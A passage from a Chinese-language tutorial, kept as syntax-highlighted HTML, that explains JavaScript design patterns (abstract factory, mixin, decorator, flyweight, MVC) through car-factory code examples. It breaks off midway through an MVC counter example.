class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，像上面这类简单场景，使用工厂模式实现对象创建这一需求，被弄得有些复杂了，所以使用时需要斟酌建立在复杂需求上的设计必要性与该模式所引入的复杂性之间的利害关系；</p><h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><p>抽象工厂模式（Abstract Factory Pattern），即对上面提到的工厂模式中的工厂的抽象，可以理解为一个超级工厂，或者创建工厂的工厂，相当于工厂的上一级，和抽象类的概念有些类似，工厂是生产某些产品的具体工厂，抽象工厂则创建具有有些相同特征的一类工厂；</p><p>沿用之前的汽车工厂的例子，汽车工厂可以生产一辆辆具体属性的某系列汽车，那么汽车抽象工厂，则可以建造不同品牌的汽车工厂，比如创建了福特汽车工厂，可以用于生产福特某系列的汽车，创建奔驰汽车工厂，可以生产奔驰一系列的汽车，示例如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 抽象汽车工厂</span><span class="token keyword">class</span> <span class="token class-name">AbstractCarFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token function">createFactory</span><span class="token punctuation">(</span><span class="token parameter">brand</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>brand <span class="token operator">===</span> <span class="token string">'Benz'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BenzFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>brand <span class="token operator">===</span> <span class="token string">'Ford'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">FordFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 奔驰汽车工厂</span><span class="token keyword">class</span> <span class="token class-name">BenzFactory</span> <span class="token punctuation">&#123;</span>    <span class="token function">createCar</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> series<span class="token punctuation">,</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span> <span class="token operator">=</span> option<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>series <span class="token operator">===</span> <span class="token string">'v1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BenzV1</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>series <span class="token operator">===</span> <span class="token string">'v2'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BenzV2</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 奔驰 v1 系列汽车</span><span class="token keyword">class</span> <span class="token class-name">BenzV1</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr <span class="token operator">=</span> option<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 奔驰 v2 系列汽车</span><span class="token keyword">class</span> <span class="token class-name">BenzV2</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr <span class="token operator">=</span> option<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 福特汽车工厂</span><span class="token keyword">class</span> <span class="token class-name">FordFactory</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token comment">// 创建汽车工厂</span><span class="token keyword">const</span> benzFactory <span class="token operator">=</span> AbstractCarFactory<span class="token punctuation">.</span><span class="token function">createFactory</span><span class="token punctuation">(</span><span class="token string">'Benz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 生产具体系列汽车</span><span class="token keyword">const</span> benzV1 <span class="token operator">=</span> benzFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">series</span><span class="token operator">:</span> <span class="token string">'v1'</span><span class="token punctuation">,</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Benz V1'</span><span class="token punctuation">,</span>    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> benzV2 <span class="token operator">=</span> benzFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">series</span><span class="token operator">:</span> <span class="token string">'v2'</span><span class="token punctuation">,</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Benz V2'</span><span class="token punctuation">,</span>    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'black'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> benzV1Attr <span class="token operator">=</span> benzV1<span class="token punctuation">.</span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> benzV2Attr <span class="token operator">=</span> benzV2<span class="token punctuation">.</span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>benzV1Attr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;name: "Benz V1", color: "red"&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>benzV2Attr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;name: "Benz V2", color: "black"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于抽象工厂是建立在工厂模式之上，所以复杂度会比之前的工厂模式更高一级，所以同样需要考虑使用该模式引入的复杂性是否是系统设计的必要；</p><h2 id="混入模式"><a href="#混入模式" class="headerlink" title="混入模式"></a>混入模式</h2><p>混入模式（Mixin Pattern），即对象实现属性的继承，功能的复用与拓展，其实就是<strong>继承</strong>这一概念的特性，该模式可以简单理解为将某一特定对象的属性方法<strong>混入</strong>多个对象中；对象中有一个原型，可以从原型中继承额外的属性，而原型又能从其它对象继承而来；在类中，子类B 继承自超类A，则类B 的实例就拥有了所有类A 的方法，还有类B 中额外定义的方法，以及重载的类A的方法；</p><p>下面是一个使用 Mixin 实现对象继承的示例，这是原始（ES5）的一种写法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> mixin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span> <span class="token string">'Knight'</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span> <span class="token string">'Huang'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>hobby <span class="token operator">=</span> <span class="token string">'Games'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 将 mixin 的属性继承给 Person，实际就是将 mixin 的所有属性，</span><span class="token comment">// 拷贝到 Person.prototype 这个对象的 __proto__ 属性中，即原型链继承；</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> mixin<span class="token punctuation">;</span><span class="token keyword">var</span> knight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">.</span>firstName<span class="token punctuation">,</span> knight<span class="token punctuation">.</span>lastName<span class="token punctuation">,</span> knight<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Knight Huang Games</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然更通用和规范的写法（ES5）是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 被继承的超类</span><span class="token keyword">function</span> <span class="token function">Mixin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> <span class="token string">'Knight'</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> <span class="token string">'Huang'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 调用超类的构造函数，继承其属性</span>    <span class="token function">Mixin</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>hobby <span class="token operator">=</span> <span class="token string">'Games'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 还需要继承超类的原型链属性</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Mixin</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> knight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;firstName: "Knight", lastName: "Huang", hobby: "Games"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更直观和方便的新语法（ES6）写法是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Mixin</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> <span class="token string">'Knight'</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> <span class="token string">'Huang'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">extends</span> <span class="token class-name">Mixin</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 调用超类构造函数，继承属性</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hobby <span class="token operator">=</span> <span class="token string">'Games'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> knight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>knight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;firstName: "Knight", lastName: "Huang", hobby: "Games"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h2><p>装饰器模式（Decorator Pattern），是一种类似混入模式的用于提升复用性的模式，其主要功能是向现有的类或对象动态添加新功能（属性/方法），并且不改变，也不用关心该类或对象原有的结构；顾名思义，现实世界的大部分装饰物，都是起着美化原有物的作用，并且基本都不会改变其结构，比如给房间添加个挂件什么的，还不至于把整个房子拆了重建，那就不是装饰而是改造了；</p><p>装饰器模式解决的问题也很明显，假如需要给某对象添加一些新特性，按传统思维就是使用继承，但是新功能的量很大，或者在不断递增时，使用继承再获取对象实例的开销（子类量）就相当大了；下面是一个车辆装饰器的简单示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>brand <span class="token operator">=</span> option<span class="token punctuation">.</span>brand<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> option<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">CarDecorator</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">car</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>car <span class="token operator">=</span> car<span class="token punctuation">;</span>        <span class="token comment">// 添加额外功能</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addColor</span><span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ...</span>    <span class="token punctuation">&#125;</span>    <span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>car<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 为汽车添加涂色</span>    <span class="token function">addColor</span><span class="token punctuation">(</span><span class="token parameter">color</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>car<span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ... 其它需要装饰的功能    </span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> benz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">brand</span><span class="token operator">:</span> <span class="token string">'Benz'</span><span class="token punctuation">,</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'My car'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> newBenz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CarDecorator</span><span class="token punctuation">(</span>benz<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> newBenzAttr <span class="token operator">=</span> newBenz<span class="token punctuation">.</span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newBenzAttr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;brand: "Benz", name: "My car", color: "blue"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里所谓的不改变原有结构进行装饰，其实就是在类的<strong>实例</strong>对象中动态增加功能，而该类的其它实例不会收到影响；</p><h2 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h2><p>享元模式（Flyweight Pattern），是一种减少对象创建数量，提倡数据共享，减少重复数据以优化性能（如内存占用）的结构化解决方案；“Flyweight”这个单词源自拳击比赛中“轻量级”选手一词，该模式的命名者也是如此取其含义，就是使应用程序更轻量级，“享元”也可以理解为共享元数据；</p><p>享元模式下一个重要概念是区分<strong>内部</strong>状态和<strong>外部</strong>状态，内部状态即需要维护的共享元，供外部共享，且不会因外部变化而改变；内部状态不被共享，会随外部环境变化而改变；享元工厂应维护一个内部状态，并能够接受或操作外部状态，同时需要将二者<strong>分离</strong>开来，相互的影响会引起系统的混乱；</p><p>以下是一个汽车工厂的例子，需要实现零件共享（如轮胎，车门，车窗…），生产组装车辆时可以使用现有零组件，零件库里没有找到再进行单独制造，然后放入零件库中供后续使用；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 单个零件类</span><span class="token keyword">class</span> <span class="token class-name">CarComponent</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span> <span class="token operator">=</span> option<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 汽车零件享元工厂</span><span class="token keyword">class</span> <span class="token class-name">FlyweightFactory</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 内部状态，供接口调用访问</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>components <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取零件</span>    <span class="token function">getComponent</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span> <span class="token operator">=</span> option<span class="token punctuation">;</span>        <span class="token keyword">let</span> component <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>components<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 存在该零件则直接返回，否则重新生产</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>component<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            component <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CarComponent</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">,</span> color<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>components<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> component<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 返回所有已有零件</span>    <span class="token function">getAllComponents</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>components<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 汽车工厂</span><span class="token keyword">class</span> <span class="token class-name">CarFactory</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 通过组装零件生产汽车</span>    <span class="token keyword">static</span> <span class="token function">createCar</span><span class="token punctuation">(</span><span class="token parameter">components</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 外部状态，与共享的内部状态分离</span>        <span class="token keyword">const</span> carAttr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        carAttr<span class="token punctuation">.</span>door <span class="token operator">=</span> components<span class="token punctuation">.</span><span class="token function">getComponent</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'door'</span><span class="token punctuation">,</span>            <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'blue'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        carAttr<span class="token punctuation">.</span>window <span class="token operator">=</span> components<span class="token punctuation">.</span><span class="token function">getComponent</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'window'</span><span class="token punctuation">,</span>            <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'transparent'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        carAttr<span class="token punctuation">.</span>tire <span class="token operator">=</span> components<span class="token punctuation">.</span><span class="token function">getComponent</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'tire'</span><span class="token punctuation">,</span>            <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'black'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> carAttr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 先实例化享元工厂，建立共享零件库</span><span class="token keyword">const</span> components <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FlyweightFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 组建汽车</span><span class="token keyword">const</span> car1 <span class="token operator">=</span> CarFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span>components<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> car2 <span class="token operator">=</span> CarFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span>components<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;</span><span class="token comment">//   "door": &#123;"name": "door", "color": "blue"&#125;,</span><span class="token comment">//   "window": &#123;"name": "window", "color": "transparent"&#125;,</span><span class="token comment">//   "tire": &#123;"name": "tire", "color": "black"&#125;</span><span class="token comment">// &#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;</span><span class="token comment">//   "door": &#123;"name": "door", "color": "blue"&#125;,</span><span class="token comment">//   "window": &#123;"name": "window", "color": "transparent"&#125;,</span><span class="token comment">//   "tire": &#123;"name": "tire", "color": "black"&#125;</span><span class="token comment">// &#125;</span><span class="token keyword">const</span> allComponents <span class="token operator">=</span> components<span class="token punctuation">.</span><span class="token function">getAllComponents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>allComponents<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;</span><span class="token comment">//   "door": &#123;"name": "door", "color": "blue"&#125;,</span><span class="token comment">//   "window": &#123;"name": "window", "color": "transparent"&#125;,</span><span class="token comment">//   "tire": &#123;"name": "tire", "color": "black"&#125;</span><span class="token comment">// &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MVC-模式"><a href="#MVC-模式" class="headerlink" title="MVC 模式"></a>MVC 模式</h2><p>MVC 模式即：模型（<strong>Model</strong>），视图（<strong>View</strong>），控制器（<strong>Controller</strong>），实现了将业务数据模型从用户视图中分离，通过控制器处理数据逻辑与页面交互逻辑；用户在视图上触发某一动作（点击、拖拽…）后，会通知处理该交互的控制器更新模型中的数据，模型更新后会再通知其观察者（视图），然后视图层收到通知便会自行做出相应更新；整体结构有些类似这样：</p><pre class="line-numbers language-none"><code class="language-none">      产生交互               更新数据View ---------&gt; Controller ----------&gt; Model ^                                       | |_______________________________________|               更新页面通知<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个极简的计数器的示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 视图</span><span class="token keyword">class</span> <span class="token class-name">CounterView</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化视图</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elCounter <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token 